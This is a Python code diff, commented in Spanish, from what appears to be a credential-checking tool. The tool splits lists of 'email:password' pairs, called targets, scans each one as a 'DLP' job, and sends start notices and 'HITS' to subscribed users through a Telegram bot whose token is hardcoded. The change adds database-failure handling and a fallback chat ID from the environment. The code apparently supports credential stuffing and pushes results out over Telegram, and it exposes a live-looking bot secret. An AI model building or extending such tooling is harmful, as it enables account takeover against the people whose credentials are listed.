@@ -460,21 +460,31 @@ def process_file_and_scan(file_path, keyword=""):
     print(f"✅ Procesando {len(valid_creds)} objetivos de forma 100% aislada...")
     
     # ── CARGAR USUARIOS ACTIVOS DE RENDER DB ──
+    users = []
     try:
         conn = get_remote_db_conn()
-        cur = conn.cursor()
-        cur.execute("SELECT telegram_chat_id FROM users WHERE telegram_chat_id IS NOT NULL AND telegram_chat_id != '' AND saved_senders IS NOT NULL AND saved_senders != ''")
-        users = cur.fetchall()
-        conn.close()
-        
+        if conn:
+            cur = conn.cursor()
+            cur.execute("SELECT telegram_chat_id FROM users WHERE telegram_chat_id IS NOT NULL AND telegram_chat_id != '' AND saved_senders IS NOT NULL AND saved_senders != ''")
+            users = cur.fetchall()
+            conn.close()
+    except Exception as e:
+        print(f"Error alerting start DB: {e}")
+
+    if not users:
+        fallback_cid = os.environ.get("TELEGRAM_CHAT_ID", "").strip()
+        if fallback_cid:
+            users = [(fallback_cid,)]
+
+    try:
         token = "8741495811:AAEOFBaW9QfFOpVWfW6kyogJskS7y4wVTIs"
         for row in users:
             cid = row[0]
             msg = f"📥 *NUEVO ARCHIVO DETECTADO (VÍA VPS AGENT)*\nSe encontró un archivo con `{len(valid_creds)}` correos en ASTERA.\n\n⚡ _Iniciando Escáner DLP Turbo Local...\nTe notificaré los HITS cuando termine._"
             requests.post(f"https://api.telegram.org/bot{token}/sendMessage", 
-                          json={"chat_id": cid, "text": msg, "parse_mode": "Markdown"})
+                          json={"chat_id": cid, "text": msg, "parse_mode": "Markdown", "disable_web_page_preview": True})
     except Exception as e:
-        print(f"Error alerting start: {e}")
+        print(f"Error alerting start telegram: {e}")
 
     def scan_cred_worker(cred):
         email, pwd = cred.split(':', 1)
@@ -496,12 +506,19 @@ def process_file_and_scan(file_path, keyword=""):
         # Multiplicamos el HIT por todos los usuarios suscritos en DB
         final_hits_to_dispatch = []
         try:
+            active_users = []
             conn = get_remote_db_conn()
-            cur = conn.cursor()
-            cur.execute("SELECT telegram_chat_id, is_superadmin FROM users WHERE telegram_chat_id IS NOT NULL AND telegram_chat_id != '' AND saved_senders IS NOT NULL AND saved_senders != ''")
-            active_users = cur.fetchall()
-            conn.close()
+            if conn:
+                cur = conn.cursor()
+                cur.execute("SELECT telegram_chat_id, is_superadmin FROM users WHERE telegram_chat_id IS NOT NULL AND telegram_chat_id != '' AND saved_senders IS NOT NULL AND saved_senders != ''")
+                active_users = cur.fetchall()
+                conn.close()
             
+            if not active_users:
+                fallback_cid = os.environ.get("TELEGRAM_CHAT_ID", "").strip()
+                if fallback_cid:
+                    active_users = [(fallback_cid, 1)]
+
             super_admins = []
             for row in active_users:
                 cid = row[0]
